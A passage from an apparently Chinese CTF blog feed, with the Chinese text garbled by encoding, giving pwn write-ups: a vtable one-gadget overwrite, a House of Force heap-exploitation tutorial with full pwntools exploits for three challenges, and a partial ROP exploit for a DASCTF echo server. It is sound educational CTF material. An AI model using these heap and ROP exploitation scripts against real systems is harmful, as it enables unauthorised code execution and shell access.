2.27å…¶éƒ½æ˜¯ä¸å¯å†™çš„</strong>ã€‚</p><p>æ­£æ˜¯å› ä¸ºå¯ä»¥å†™ï¼Œæ‰€ä»¥è¿™ä¸ªé¢˜éš¾åº¦å°±é™ä½äº†å¾ˆå¤šã€‚</p><h4 id="æ”»å‡»æ€è·¯-1"><a href="#æ”»å‡»æ€è·¯-1" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h4><p>åˆ©ç”¨ç¨‹åºçš„æœ€åä¸€æ¬¡ä»»æ„åœ°å€å†™ï¼Œç›´æ¥æŠŠ<code>__IO_2_1_stderrçš„vtable</code>ä¸Š<code>__finish__</code>æŒ‡é’ˆä¿®æ”¹ä¸ºone gadgetã€‚<br>ï¼ˆè¿™é‡Œçš„one gadgetï¼Œéœ€è¦è‡ªå·±å¤šè¯•ï¼‰ã€‚</p><h5 id="å°tips"><a href="#å°tips" class="headerlink" title="å°tips"></a>å°tips</h5><p>ç¬¬2æ¬¡çš„2å­—èŠ‚è¯»å…¥å¯ä»¥ç›´æ¥ç”¨å…¶æœ¬æ¥åœ°å€æœ«2å­—èŠ‚å³å¯ï¼Œç›´æ¥åœ¨<code>__IO_2_1_stderrçš„vtable</code>ä¸ç”¨è½¬ç§»ä¹Ÿå¯ä»¥çš„ã€‚ï¼ˆçœ‹åˆ°æœ‰åˆ«çš„å¸ˆå‚…è½¬ç§»åˆ°å…¶ä»–vtableåœ°å€çš„ã€‚ï¼‰å¹¶ä¸”ï¼Œç”±äºæ˜¯readå‡½æ•°ï¼Œç›´æ¥å‘ä¸ª<code>\x60</code>ä¸€ä¸ªå­—èŠ‚å³å¯ã€‚</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *import timelocal_file  = &#39;./secret&#39;local_libc  = &#39;/usr/lib/x86_64-linux-gnu/libc-2.29.so&#39;remote_libc = &#39;./libc6_2.29-0ubuntu2_amd64.so&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;183.129.189.60&#39;,10030)    libc = ELF(remote_libc)elf = ELF(local_file)# libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()ru(&quot;0x&quot;)libc_base = int(r(12),16) - libc.symbols[&quot;printf&quot;]info_addr(&quot;libc_base&quot;,libc_base)ru(&quot;addr&quot;)vtable = 0x1e5758 + libc_bases(p64(vtable))sleep(0.1)# debug()s(&#39;\x60&#39;)sleep(0.1)rec = 0xe2386 + libc_bases(p64(0) + p64(0)+p64(rec))itr()</code></pre><p>ç”±äºæå‰å°±<code>fclose(stdout)</code>,getshellä»¥åä¹Ÿä¸ä¼šæœ‰ä»»ä½•çš„è¾“å‡ºï¼Œæ‰€ä»¥å¾—ç”¨<code>exec 1&gt;&amp;2</code>æ¥æ¢å¤è¾“å‡ºã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>House of Force</title>
    <link href="/2020/05/13/House%20of%20Force/"/>
    <url>/2020/05/13/House%20of%20Force/</url>
    
    <content type="html"><![CDATA[<h1 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åŸºæœ¬æŒ‰ç…§è¿™wikiä¸Šé¢å­¦çš„ï¼Œç®€å•è®°å½•ä¸€ä¸‹ã€‚</p><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/J22cKM.png" srcset="/img/loading.gif" alt></p><h3 id="ä½¿ç”¨æ¡ä»¶"><a href="#ä½¿ç”¨æ¡ä»¶" class="headerlink" title="ä½¿ç”¨æ¡ä»¶"></a>ä½¿ç”¨æ¡ä»¶</h3><ul><li>èƒ½å¤Ÿä»¥æº¢å‡ºç­‰æ–¹å¼æ§åˆ¶åˆ° top chunk çš„ size åŸŸ</li><li>èƒ½å¤Ÿè‡ªç”±åœ°æ§åˆ¶å †åˆ†é…å°ºå¯¸çš„å¤§å°<h3 id="äº§ç”ŸåŸå› "><a href="#äº§ç”ŸåŸå› " class="headerlink" title="äº§ç”ŸåŸå› "></a>äº§ç”ŸåŸå› </h3>House Of Force äº§ç”Ÿçš„åŸå› åœ¨äº glibc å¯¹ top chunk çš„å¤„ç†ï¼šè¿›è¡Œå †åˆ†é…æ—¶,å¦‚æœæ‰€æœ‰ç©ºé—²çš„å—éƒ½æ— æ³•æ»¡è¶³éœ€æ±‚,é‚£ä¹ˆå°±ä¼šä» top chunk ä¸­åˆ†å‰²å‡ºç›¸åº”çš„å¤§å°ä½œä¸ºå †å—çš„ç©ºé—´ã€‚</li></ul><p>æ‰€ä»¥å½“ä½¿ç”¨ top chunk åˆ†é…å †å—çš„ size å€¼æ˜¯ç”±ç”¨æˆ·æ§åˆ¶çš„ä»»æ„å€¼æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆ?ç­”æ¡ˆæ˜¯,å¯ä»¥ä½¿å¾— top chunkæŒ‡å‘æˆ‘ä»¬æœŸæœ›çš„ä»»ä½•ä½ç½®,è¿™å°±ç›¸å½“äºä¸€æ¬¡ä»»æ„åœ°å€å†™ã€‚</p><pre><code>// è·å–å½“å‰çš„top chunkï¼Œå¹¶è®¡ç®—å…¶å¯¹åº”çš„å¤§å°victim = av-&gt;top;size   = chunksize(victim);// å¦‚æœåœ¨åˆ†å‰²ä¹‹åï¼Œå…¶å¤§å°ä»ç„¶æ»¡è¶³ chunk çš„æœ€å°å¤§å°ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è¿›è¡Œåˆ†å‰²ã€‚if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) {    remainder_size = size - nb;    remainder      = chunk_at_offset(victim, nb);    av-&gt;top        = remainder;    set_head(victim, nb | PREV_INUSE |            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));    set_head(remainder, remainder_size | PREV_INUSE);    check_malloced_chunk(av, victim, nb);    void *p = chunk2mem(victim);    alloc_perturb(p, bytes);    return p;}</code></pre><p>æ‰€ä»¥ï¼Œå¦‚æœå¯ä»¥ç¯¡æ”¹ size ä¸ºä¸€ä¸ªå¾ˆå¤§å€¼,å°±å¯ä»¥è½»æ¾çš„é€šè¿‡è¿™ä¸ªéªŒè¯,è¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬å‰é¢è¯´çš„éœ€è¦ä¸€ä¸ªèƒ½å¤Ÿæ§åˆ¶top chunk size åŸŸçš„æ¼æ´ã€‚</p><h2 id="ä¸€èˆ¬çš„åˆ©ç”¨åŠæ³•"><a href="#ä¸€èˆ¬çš„åˆ©ç”¨åŠæ³•" class="headerlink" title="ä¸€èˆ¬çš„åˆ©ç”¨åŠæ³•"></a>ä¸€èˆ¬çš„åˆ©ç”¨åŠæ³•</h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/MW2ASE.png" srcset="/img/loading.gif" alt></p><pre><code>remainder      = chunk_at_offset(victim, nb);av-&gt;top        = remainder;/* Treat space at ptr + offset as a chunk */#define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))</code></pre><p>ä¹‹åè¿™é‡Œä¼šæŠŠ top chunkçš„ æŒ‡é’ˆæ›´æ–°ï¼Œæ¥ä¸‹æ¥çš„å †å—å°±ä¼šåˆ†é…åˆ°è¿™ä¸ªä½ç½®ï¼Œç”¨æˆ·åªè¦æ§åˆ¶äº†è¿™ä¸ªæŒ‡é’ˆå°±ç›¸å½“äºå®ç°ä»»æ„åœ°å€å†™ä»»æ„å€¼(write-anything-anywhere)ã€‚</p><h2 id="ç®€å•å®ä¾‹"><a href="#ç®€å•å®ä¾‹" class="headerlink" title="ç®€å•å®ä¾‹"></a>ç®€å•å®ä¾‹</h2><h3 id="è®©top-chunk-çš„æŒ‡é’ˆå‡å°æ¥ä¿®æ”¹ä½äºå…¶ä¸Šé¢-ä½åœ°å€-çš„gotè¡¨ä¸­çš„å†…å®¹"><a href="#è®©top-chunk-çš„æŒ‡é’ˆå‡å°æ¥ä¿®æ”¹ä½äºå…¶ä¸Šé¢-ä½åœ°å€-çš„gotè¡¨ä¸­çš„å†…å®¹" class="headerlink" title="è®©top chunk çš„æŒ‡é’ˆå‡å°æ¥ä¿®æ”¹ä½äºå…¶ä¸Šé¢(ä½åœ°å€) çš„gotè¡¨ä¸­çš„å†…å®¹"></a>è®©top chunk çš„æŒ‡é’ˆå‡å°æ¥ä¿®æ”¹ä½äºå…¶ä¸Šé¢(ä½åœ°å€) çš„gotè¡¨ä¸­çš„å†…å®¹</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/DKC4bL.png" srcset="/img/loading.gif" alt><br>è¿™ä¸ªæ ¸å¿ƒå°±æ˜¯æ¥ç¼©å°top chunk çš„æŒ‡é’ˆï¼Œæ¥ä¿®æ”¹ä½äºå…¶ä¸Šé¢(ä½åœ°å€) çš„æŸå¤„ä¸­çš„å†…å®¹ã€‚è¿™é‡Œå¯èƒ½æ˜¯heapçš„æŒ‡é’ˆï¼Œgotè¡¨ã€‚</p><p><strong>è¿™å…¶ä¸­æœ‰ä¸ªéš¾ç¼ çš„é—®é¢˜å°±æ˜¯ç»“æ„ä½“å¯¹é½é—®é¢˜ï¼Œç›®å‰æˆ‘æ‰€ç»ƒä¹ åˆ°çš„é¢˜é‡åˆ°è¿™ä¸ªé—®é¢˜çš„éƒ½æ˜¯ï¼Œå‡å»ä¸€ä¸‹<code>SIZE_SZ</code>ï¼ˆ64ä½æ˜¯8 ï¼Œ32ä½æ˜¯4ï¼‰ã€‚</strong></p><h3 id="è®©é‚£ä¸ªtop-chunk-æŒ‡é’ˆå¢å¤§æ¥ä¿®æ”¹ä½äºé«˜åœ°å€ç©ºé—´çš„å†…å®¹"><a href="#è®©é‚£ä¸ªtop-chunk-æŒ‡é’ˆå¢å¤§æ¥ä¿®æ”¹ä½äºé«˜åœ°å€ç©ºé—´çš„å†…å®¹" class="headerlink" title="è®©é‚£ä¸ªtop chunk æŒ‡é’ˆå¢å¤§æ¥ä¿®æ”¹ä½äºé«˜åœ°å€ç©ºé—´çš„å†…å®¹"></a>è®©é‚£ä¸ªtop chunk æŒ‡é’ˆå¢å¤§æ¥ä¿®æ”¹ä½äºé«˜åœ°å€ç©ºé—´çš„å†…å®¹</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/s1Uuan.png" srcset="/img/loading.gif" alt><br>è¿™ä¸ªæ˜¯è¾ƒå¥½ç†è§£çš„ï¼Œå¸¸ç”¨ä¿®æ”¹libcä¸Šé¢æŸå¤„çš„åœ°å€ã€‚</p><h2 id="hitcon-training-bamboobox"><a href="#hitcon-training-bamboobox" class="headerlink" title="hitcon-training-bamboobox"></a>hitcon-training-bamboobox</h2><p>ä¸»è¦æ˜¯ä¿®æ”¹ä¸€ä¸‹ï¼Œå¼€å§‹ç¨‹åºè‡ªåŠ¨åˆ›å»ºçš„å­˜æ”¾2ä¸ªå‡½æ•°æŒ‡é’ˆçš„å †ï¼Œå…¶ä¸­hello-messageç”¨äºç¨‹åºå¼€å§‹æ—¶ä½¿ç”¨ï¼Œgoodbye-message ç”¨äºåœ¨ç¨‹åºç»“æŸæ—¶ä½¿ç”¨ã€‚</p><h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><ul><li>æ·»åŠ å †å—ï¼Œåˆ©ç”¨å †æº¢å‡ºæ¼æ´è¦†ç›– top chunk çš„å¤§å°ä¸º -1ï¼Œå³ 64 ä½æœ€å¤§å€¼ã€‚</li><li>åˆ©ç”¨ house of force æŠ€å·§ï¼Œåˆ†é… chunk è‡³å †çš„åŸºåœ°å€ã€‚</li><li>è¦†ç›– goodbye-message ä¸ºmagic å‡½æ•°åœ°å€æ¥æ§åˆ¶ç¨‹åºæ‰§è¡Œæµã€‚</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./bamboobox&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6debug = 1if debug:    io = process(local_file)    context.log_level = &#39;debug&#39;    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,25784)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,content):    sla(&#39;choice&#39;,&#39;2&#39;)    sla(&#39;item name:&#39;,str(size))    sa(&#39;item&#39;,str(content))def free(id):    sla(&#39;choice&#39;,&#39;4&#39;)    sla(&#39;item&#39;,str(id))def show(id):    sla(&#39;choice&#39;,&#39;1&#39;)def edit(id,size,content):    sla(&#39;choice&#39;,&#39;3&#39;)    sla(&#39;item&#39;,str(id))    sla(&#39;item name&#39;,str(size))    sa(&#39;item&#39;,str(content))context.log_level = &#39;debug&#39;magic = 0x400d49add(0x30,&#39;chum&#39;)payload = &#39;a&#39; * 0x30 +p64(0) + p64(0xffffffffffffffff)edit(0,0x40,payload)size = -(0x40 + 0x20) - 0x10add(size,&#39; &#39;)payload = p64(0x400d49) + p64(0x400d49)add(0x10,payload)# sla(&#39;choice:&#39;,&#39;5&#39;)itr()</code></pre><h2 id="gyctf-2020-force"><a href="#gyctf-2020-force" class="headerlink" title="gyctf-2020-force"></a>gyctf-2020-force</h2><h3 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/uYKO6A.png" srcset="/img/loading.gif" alt><br>å¯ä»¥å®ç°å †æº¢å‡ºã€‚å¹¶ä¸”åœ¨ä½ ç”³è¯·ä¸€ä¸ªå †å—ä»¥åï¼Œç¨‹åºä¼šç»™ä½ æ‰“å°å‡ºå †å—çš„åœ°å€ï¼Œè¿™æ ·å°±å¯ä»¥æ³„éœ²å‡ºä¿¡æ¯ã€‚</p><h3 id="åˆ©ç”¨æ€è·¯-1"><a href="#åˆ©ç”¨æ€è·¯-1" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><ul><li>ç”³è¯·ä¸€ä¸ªå¾ˆå¤§å †ï¼Œç„¶åç¨‹åºä¼šmmapå¼€å¯ä¸€ä¸ªå †å—ï¼Œæ­¤æ—¶å°±å¯ä»¥æ³„æ¼å‡ºlibcçš„åœ°å€ã€‚</li><li>HOF</li><li><code>__malloc_hook</code> + one gadget</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;local_file  = &#39;./gyctf_2020_force&#39;remote_libc = local_libc # &#39;../libc.so.6debug = 0if debug:    io = process(local_file)    context.log_level = &#39;debug&#39;    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29457)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,date):    sla(&#39;2:puts&#39;,&#39;1&#39;)    sla(&#39;size&#39;,str(size))    ru(&#39;bin addr 0x&#39;)    heapaddr = int(r(12),16)    info_addr(&#39;heapaddr&#39;,heapaddr)    sa(&#39;content&#39;,str(date))    return heapaddrpayload = 0x30 * &#39;a&#39; + p64(0) + p64(0xffffffffffffffff)libc_base = add(0x200000,&#39;111&#39;) + 0x200ff0info_addr(&#39;libc_base&#39;,libc_base)malloc_hook = libc_base + 0x3c4b10heapaddr = add(0x30,payload)size = malloc_hook-(heapaddr + 0x30) - 0x10 - 0x8 -0x8 -0x8print(&#39;size----&gt;&#39;+hex(size))add(size,&#39;a&#39;)rce = rce16[1] + libc_basepayload = p64(0) + p64(rce) + p64(libc_base + libc.symbols[&#39;__libc_realloc&#39;] + realloc[1])add(0x20,payload)sla(&#39;2:puts&#39;,&#39;1&#39;)sla(&#39;size&#39;,&#39;30&#39;)# dbg()itr()</code></pre><h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a><code>bcloud_bctf_2016</code></h2><p>è¿™ä¸ªé¢˜æ˜¯ä¸€ä¸ªååˆ†ç²¾å¦™çš„é¢˜ï¼Œæ¼æ´å‡ºç°åœ¨ç¨‹åºåˆå§‹åŒ–ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/JMsnrt.png" srcset="/img/loading.gif" alt></p><p>strcpyæ˜¯ä»¥<code>\x00</code>æ¥åˆ¤æ–­ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç»“æŸçš„ã€‚<br>åœ¨æ ˆä¸­ï¼Œå½“è¾“å…¥0x40ä¸ªå­—ç¬¦æ—¶ï¼Œå› ä¸ºv2æ­£å¥½åœ¨sä¸‹é¢ï¼Œè¿™å°±è®©strcpyä»så¾€v2ä¸Šé¢å¤åˆ¶æ—¶ä¼š<strong>æŠŠè¿™ä¸ªå †å—çš„åœ°å€ä¹Ÿç»™å¤åˆ¶ä¸Šå»</strong>ï¼Œå½“å…¶è¿”å›nameæ—¶ï¼Œä¹Ÿå°±è¿”å›äº†å †å—åœ°å€ï¼Œç„¶åå°±å¯ä»¥ç®—å‡ºå †å—çš„åŸºåœ°å€ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/5n1Rtx.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/BGZjNT.png" srcset="/img/loading.gif" alt></p><p>åˆ°äº†è¿™ä¸ªä¹Ÿæ˜¯è¿™ä¸ªæ¼æ´ï¼Œå¡«å……å®Œ0x40ä¸ªå­—ç¬¦åï¼Œä¼šæŠŠorgå †å—çš„æŒ‡é’ˆå’Œv3é‡Œé¢çš„å†…å®¹ç»™å¤åˆ¶åˆ°orgå¯¹åº”çš„å †å—é‡Œï¼Œä¹Ÿå°±æ˜¯0x40 + 4 + len(v3)å­—èŠ‚çš„ä¸œè¥¿ã€‚orgåœ¨å †å—æ’å¸ƒä¸­ä¹Ÿæ˜¯æœ€åä¸€ä¸ªï¼Œå¦‚æœä¼ è¿‡å»<code>0xffffffff</code>,å°±å¯ä»¥æ”¹åˆ°top chunkçš„sizeä½ã€‚</p><h3 id="åˆ©ç”¨æ€è·¯-2"><a href="#åˆ©ç”¨æ€è·¯-2" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><ul><li>leakå †å—base</li><li>ä¿®æ”¹top chunk size</li><li>hofåˆ°heaplistå¤„</li><li>ç»™heaplistå†™ä¸Šfree gotï¼Œç”¨editï¼Œä¿®æ”¹å…¶ä¸ºputs</li><li>æ³„æ¼libcåœ°å€</li><li>ä¿®æ”¹free got ä¸ºsystemï¼Œç„¶åæŒ‡å‘<code>/bin/sh\x00</code></li></ul><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *from LibcSearcher import *import timelocal_file  = &#39;./bcloud_bctf_2016&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6debug = 0if debug:    io = process(local_file)    context.log_level = &#39;debug&#39;    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27301)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def name(name):    sa(&#39;name&#39;,str(name))    ru(&#39;b&#39;)    heapbase = uu32(r(4)) - 0x8    info_addr(&#39;heapbase&#39;,heapbase)    return heapbasedef org(org,host):    sa(&#39;Org:&#39;,str(org))    sla(&#39;Host:&#39;,str(host))def add(size,content):    sla(&#39;option---&gt;&gt;&#39;,&#39;1&#39;)    sla(&#39;length&#39;,str(size))    sa(&#39;content:&#39;,str(content))def edit(id,content):    sla(&#39;---&gt;&gt;&#39;,&#39;3&#39;)    sla(&#39;id&#39;,str(id))    sa(&#39;the new content&#39;,str(content))def free(id):    sla(&#39;-&gt;&#39;,&#39;4&#39;)    sla(&#39;id&#39;,str(id))context.log_level = &#39;debug&#39;sizelist = 0x804B0A0heaplist = 0x804B120heapbase = name(&#39;a&#39; * (0x40-1) + &#39;b&#39;)top = heapbase + 0xd8info_addr(&#39;top&#39;,top)org(&#39;b&#39;*0x40,p32(0xffffffff)) #chang top chunk sizesize = heaplist - top - 0x10add(size,&#39;\n&#39;)add(0x18,&#39;\n&#39;)payload = p32(0) + p32(elf.got[&#39;free&#39;]) + p32(elf.got[&#39;atoi&#39;])  +p32(0x804B128+4+4) + &#39;/bin/sh\x00&#39;edit(1,payload + &#39;\n&#39;)puts_plt = elf.plt[&#39;puts&#39;]edit(1,p32(puts_plt) + &#39;\n&#39;)free(2)io.recv(1)io.recv(1)atoi = uu32(r(4))info_addr(&#39;atoi&#39;,atoi)libc = LibcSearcher(&#39;atoi&#39;,atoi)libc_base = atoi - libc.dump(&#39;atoi&#39;)system = libc_base + libc.dump(&#39;system&#39;)info_addr(&#39;libc_base&#39;,libc_base)edit(1,p32(system) + &#39;\n&#39;)free(3)itr()</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>Houseç³»åˆ—</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTFå®‰æ’æœˆèµ›(4th)</title>
    <link href="/2020/04/25/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B/"/>
    <url>/2020/04/25/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="DASCTFå®‰æ’æœˆèµ›-pwn"><a href="#DASCTFå®‰æ’æœˆèµ›-pwn" class="headerlink" title="DASCTFå®‰æ’æœˆèµ›-pwn"></a>DASCTFå®‰æ’æœˆèµ›-pwn</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¼€èµ›äº†ï¼Œæœ‰ç‚¹äº‹æƒ…æ²¡æ‰“ï¼Œæ™šä¸Šå¤ç°äº†ä¸€ä¸‹ã€‚</p><h2 id="echo-server"><a href="#echo-server" class="headerlink" title="echo-server"></a>echo-server</h2><pre><code class="python">[*] &#39;/ctf/work/ahys/echo server/test&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>ç¨‹åºå¾ˆç®€å•ï¼Œç»å…¸æ ˆæº¢å‡ºï¼Œropåˆ©ç”¨å³å¯ã€‚<br>ä½†æ˜¯å› ä¸ºæ˜¯64ä½çš„ï¼Œå¹¶ä¸”æ˜¯glibc2.27ï¼Œå‘ç°åœ¨åšçš„æ—¶å€™æ„é€ ropé“¾æ€»æ˜¯ä¼šcurshï¼Œ<br>è°ƒè¯•å‘ç°ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/jfAEUD.png" srcset="/img/loading.gif" alt><br>å‘ç°è¿™æ®µæ±‡ç¼–ç›´æ¥ä¼šè®©ç¨‹åºcurshï¼Œæƒ³èµ·æ¥exå¸ˆå‚…ä¸€ç¯‡æ–‡ç« åˆ†æè¿‡ï¼Œ64ä½ç¨‹åºropåˆ°systemæ‹¿shellçš„æ—¶å€™ä¹Ÿä¼šè¿™æ ·ã€‚ä½†æ˜¯å¾ˆå¥‡æ€ªè¿™ä¸ªä¹Ÿå‡ºç°äº†ï¼Œç´¢æ€§å°è¯•ä¸€æ³¢ã€‚<br>è§£å†³åŠæ³•ï¼šè¿˜æ˜¯åŠ ä¸ªretï¼Œè®©æ ˆå¯¹å…¶å³å¯ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *local_file  = &#39;./test&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39;remote_libc = &#39;./libc.so.6&#39;debug = 1if debug:    io = process(local_file)    libc = ELF(local_libc)else:    # io = remote(&#39;node3.buuoj.cn&#39;,25390)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = &#39;debug&#39;context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)    gdb.attach(io)    pause()pop_rdi = 0x0000000000400823# : pop rdi ; retoffset = 136start = 0x4005C0ret = 0x0400768sla(&#39;how long is your name:&#39;,&#39;500&#39;)payload = &#39;\x00&#39; * offset + flat([ret,pop_rdi,elf.got[&#39;read&#39;],elf.plt[&#39;printf&#39;],start])# dbg()sla(&#39;s you name?&#39;,payload)ru(&#39;hello &#39;)read = uu64(r(6))info_addr(&#39;printf&#39;,read)libc_base = read - libc.symbols[&#39;read&#39;]info_addr(&#39;libc_base&#39;,libc_base)binsh = libc_base  + libc.search(&quot;/bin/sh&quot;).next()system = libc_base + libc.sym[&#39;system&#39;]sla(&#39;how long is your name: &#39;,&#39;500&#39;)payload = &#39;\x00&#39; * offset + flat([ret,pop_rdi,binsh,system])# rec = 0x4f322 + libc_base# 